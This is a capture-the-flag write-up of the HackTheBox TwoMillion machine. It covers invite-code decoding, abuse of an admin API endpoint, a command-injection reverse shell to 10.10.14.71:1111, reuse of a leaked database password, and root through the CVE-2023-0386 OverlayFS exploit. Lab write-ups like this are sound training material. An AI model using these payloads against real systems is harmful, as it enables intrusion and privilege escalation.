---
render_with_liquid: false
title: HackTheBox Writeup  TwoMillion
date: 2023-07-04 19:29:27 +1400
tags: [hackthebox, linux, nmap, api, broken-access-control, command-injection, cve-2023-0386, cyberchef, php, burpsuite]
---



TwoMillion is a special release from HackTheBox to celebrate 2,000,000 HackTheBox members. It released directly to retired, so no points and no bloods, just for run. It features a website that looks like the original HackTheBox platform, including the original invite code challenge that needed to be solved in order to register. Once registered, I’ll enumerate the API to find an endpoint that allows me to become an administrator, and then find a command injection in another admin endpoint. I’ll use database creds to pivot to the next user, and a kernel exploit to get to root. In Beyond Root, I’ll look at another easter egg challenge with a thank you message, and a YouTube video exploring the webserver and it’s vulnerabilities.


# Recon
---
Add to hosts

```bash
┌──(kali㉿kali)-[~/htb/TwoMillion]
└─$ curl -I 10.10.11.221 -s|grep Loca
Location: http://2million.htb/
```

```bash
echo '10.10.11.221 2million.htb' | sudo tee -a /etc/hosts
```


## Nmap

```bash

# Nmap 7.94 scan initiated Tue Jul  4 19:29:27 2023 as: nmap -sVC -p- -T4 -Pn -vv -oA 2million 2million.htb
Nmap scan report for 2million.htb (10.10.11.221)
Host is up, received user-set (0.056s latency).
Scanned at 2023-07-04 19:29:27 CST for 39s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx
|_http-title: Hack The Box :: Penetration Testing Labs
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-favicon: Unknown favicon MD5: 20E95ACF205EBFDCB6D634B7440B0CEE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Tue Jul  4 19:30:06 2023 -- 1 IP address (1 host up) scanned in 39.52 seconds
```


# User Flag
---

## Invite Code

To join HTB, needs invite code

![](/assets/obsidian/2d8fe456e1f88175d3c7e7309cd88ade.png)

Check if the invite code functionality can be measured through front-end

![](/assets/obsidian/98321d9bab5b7000bf2a92c57ce596fb.png)

Deobfuscate the js 

![](/assets/obsidian/3625d9f21b5408eda978ec78c8fcff5b.png)

```bash
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```

```bash
┌──(kali㉿kali)-[~/htb/TwoMillion]
└─$ curl http://2million.htb/api/v1/invite/how/to/generate -X POST
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```

Cyberchef decode rot13

![](/assets/obsidian/8c9844f57d468a89dc7fa83fd2f27183.png)

```bash
┌──(kali㉿kali)-[~/htb/TwoMillion]
└─$ echo '\/api\/v1\/invite\/generate'|tr -d '\\'
/api/v1/invite/generate

┌──(kali㉿kali)-[~/htb/TwoMillion]
└─$ curl -X POST http://2million.htb/api/v1/invite/generate
{"0":200,"success":1,"data":{"code":"VElOVE8tMTdFNlMtWFlRQU0tV0FZWVM=","format":"encoded"}}

┌──(kali㉿kali)-[~/htb/TwoMillion]
└─$ echo $(curl -X POST http://2million.htb/api/v1/invite/generate -s)|jq .data.code|tr -d '"'|base64 -d
BEJX5-8XHUQ-PSK43-NHTE2
```

Register

![](/assets/obsidian/014634955915a329160bcacfd4b63b37.png)

After login

![](/assets/obsidian/3bcda591ce52572e6769db303faec6a2.png)


## API Broken Access Control to admin

Head to API documents

![](/assets/obsidian/5136f892bd1b356da612737213a92178.png)

Check if some admin functions have broken access control

Go to http history send the manually visited request to repeater and change request method to `PUT`

![](/assets/obsidian/ab46044ef95c8628e4d7006fc5a91a26.png)

Add content type : `json`

![](/assets/obsidian/2dc30c165850a86e88c5ed1bf3495b8c.png)

Add required parameters: `email`, `is_admin`

![](/assets/obsidian/85334dab98ee537dff3ab7df1d3c1cc9.png)

Confirmed that I'm admin now

![](/assets/obsidian/d4cc30c40bac9594b21a0730ad4af838.png)

> This vulnerability can be mapped to **WSTG-BUSL-02 : Test Ability to Forge Requests** using [WSTG - v4.2](https://owasp.org/www-project-web-security-testing-guide/v42)

## Command Injection

It's probably using bash command to generate VPN, try command injection

![](/assets/obsidian/e8b3351a5e2b9efda3a116362038669d.png)

Get reverse shell

```bash
;/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.71/1111 0>&1' #
```

> Alternative way to inject: `$(/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.71/1111 0>&1')`

![](/assets/obsidian/bbd734457bff5f141554f958944c0849.png)

```bash
┌──(kali㉿kali)-[~/htb/TwoMillion]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.71] from (UNKNOWN) [10.10.11.221] 58282
bash: cannot set terminal process group (1157): Inappropriate ioctl for device
bash: no job control in this shell

www-data@2million:~/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@2million:~/html$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(kali㉿kali)-[~/htb/TwoMillion]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
```

```bash
www-data@2million:~/html$ ls -la
ls -la
total 56
drwxr-xr-x 10 root root 4096 Jul  5 06:30 .
drwxr-xr-x  3 root root 4096 Jun  6 10:22 ..
-rw-r--r--  1 root root   87 Jun  2 18:56 .env
-rw-r--r--  1 root root 1237 Jun  2 16:15 Database.php
-rw-r--r--  1 root root 2787 Jun  2 16:15 Router.php
drwxr-xr-x  5 root root 4096 Jul  5 06:30 VPN
drwxr-xr-x  2 root root 4096 Jun  6 10:22 assets
drwxr-xr-x  2 root root 4096 Jun  6 10:22 controllers
drwxr-xr-x  5 root root 4096 Jun  6 10:22 css
drwxr-xr-x  2 root root 4096 Jun  6 10:22 fonts
drwxr-xr-x  2 root root 4096 Jun  6 10:22 images
-rw-r--r--  1 root root 2692 Jun  2 18:57 index.php
drwxr-xr-x  3 root root 4096 Jun  6 10:22 js
drwxr-xr-x  2 root root 4096 Jun  6 10:22 views
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
www-data@2million:~/html$
```

```bash
www-data@2million:~/html$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
admin:x:1000:1000::/home/admin:/bin/bash
www-data@2million:~/html$ su - admin
Password:
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$ whoami
admin
admin@2million:~$ cat /home/admin/user.txt
52c9066f6c9c7d7fdf73f714668d7dde
```


# Root Flag
---


## CVE-2023-0386

Ran `linpeas`

![](/assets/obsidian/83fcd8fcdc5c22aca380c33500e6d51c.png)

```bash
admin@2million:/$ cat /var/mail/admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

```bash
admin@2million:~$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

The version was released on 2022

Google : `OverlayFS 2023 priv escalate`

![](/assets/obsidian/a33834e050053be592bbb30ef6d83756.png)

Found POC on github: https://github.com/xkaneiki/CVE-2023-0386

Copy the POC to target

```bash
┌──(kali㉿kali)-[~/htb/TwoMillion/www]
└─$ git clone https://github.com/xkaneiki/CVE-2023-0386

┌──(kali㉿kali)-[~/htb/TwoMillion/www]
└─$ sshpass -p 'SuperDuperPass123' scp -r CVE-2023-0386 admin@2million.htb:/tmp/
```

On target, build the binaries

```bash
admin@2million:/tmp$ cd CVE-2023-0386/
admin@2million:/tmp/CVE-2023-0386$ make all
```

Run these two commands in separated terminal

```bash
./fuse ./ovlcap/lower ./gc
```

```bash
./exp
```

![](/assets/obsidian/6a7b6d02cd9f7cea4f77f8068b1263d3.png)

> Note that if the exploit was put at places such as `/dev/shm/` , it will fail.


# Additional
---


## Easter Egg

```bash
root@2million:/root# ls
root.txt  snap  thank_you.json
```

Cyberchef Url decode and from hex

![](/assets/obsidian/540c55aeecb172cefc1c395839375d58.png)

Decode from base64 then XOR with key : `HackTheBox`

![](/assets/obsidian/e7a092cd308919661156c545b96abb79.png)

```bash
Dear HackTheBox Community,

We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.

From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.

To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.

Here's to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.

With deepest gratitude,

The HackTheBox Team
```


## Enumerate User Owned Objects

Find files and directories that are owned by a user

```bash
find / -user admin 2>/dev/null|grep -v -E '^/proc|^/run|^/sys|^/tmp'
```

```bash
/home/admin
/home/admin/.gnupg
/home/admin/.gnupg/pubring.kbx
/home/admin/.gnupg/trustdb.gpg
/home/admin/.gnupg/private-keys-v1.d
/home/admin/.cache
/home/admin/.cache/motd.legal-displayed
/home/admin/snap
/home/admin/snap/lxd
/home/admin/snap/lxd/current
/home/admin/snap/lxd/24322
/home/admin/snap/lxd/common
/home/admin/snap/lxd/common/config
/home/admin/snap/lxd/common/config/config.yml
/home/admin/.ssh
/home/admin/.profile
/home/admin/.bash_logout
/home/admin/.bashrc
/var/mail/admin
/dev/pts/1
```

